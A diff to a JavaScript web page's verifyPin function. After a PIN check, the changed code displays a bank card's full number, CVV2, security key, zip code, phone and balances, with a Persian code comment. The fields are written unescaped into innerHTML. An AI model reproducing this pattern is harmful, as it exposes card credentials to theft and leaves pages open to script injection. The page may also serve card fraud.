@@ -348,14 +348,22 @@ async function verifyPin() {
         // نمایش کارت
         document.getElementById('cardNumberDisplay').textContent = '•••• •••• •••• ' + String(data.cardNumber || '0000').slice(-4);
         document.getElementById('cardHolder').textContent = (data.accountName || 'Employee').toUpperCase();
-        document.getElementById('balanceDisplay').textContent = '€' + newBalance.toLocaleString('en-US');
+        document.getElementById('balanceDisplay').textContent = '€' + newRemainder.toLocaleString('en-US');
         document.getElementById('bankCard').classList.add('show');
         
         document.getElementById('infoContent').innerHTML = `
+            <div>🌐 Status: <span style="color:#4caf50;">${data.cardStatus || data.status || 'Online'}</span></div>
+            <div>🏛️ Name Bank: <span style="color:#4caf50;">${data.nameBank || 'COMMERZBANK'}</span></div>
             <div>👤 Account Name: <span style="color:#4caf50;">${data.accountName || '-'}</span></div>
-            <div>💰 Salary: <span style="color:#4caf50;">€${newBalance.toLocaleString('en-US')}</span></div>
-            <div>💳 Remainder: <span style="color:#4caf50;">${newRemainder}</span></div>
-            <div>🆔 Employee ID: <span style="color:#4caf50;">${currentEmpId}</span></div>
+            <div>💳 Card Number: <span style="color:#4caf50;">${data.cardNumber || '-'}</span></div>
+            <div>💰 Account Balance: <span style="color:#4caf50;">${data.accountBalance || '€' + newBalance.toLocaleString('en-US')}</span></div>
+            <div>💰 Remainder Balance: <span style="color:#4caf50;">${newRemainder}</span></div>
+            <div>🔑 Security Key: <span style="color:#4caf50;">${data.securityKey || '-'}</span></div>
+            <div>📍 Zip Code: <span style="color:#4caf50;">${data.zipCode || '-'}</span></div>
+            <div>🔒 Cvv2: <span style="color:#4caf50;">${data.cvv2 || '-'}</span></div>
+            <div>📋 Line Card: <span style="color:#4caf50;">${data.lineCard || '-'}</span></div>
+            <div>📞 Phone: <span style="color:#4caf50;">${data.phone || '-'}</span></div>
+            <div>🆔 Employee ID: <span style="color:#4caf50;">${currentEmpId || data.empId || '-'}</span></div>
         `;
         document.getElementById('fullInfo').classList.add('show');
         
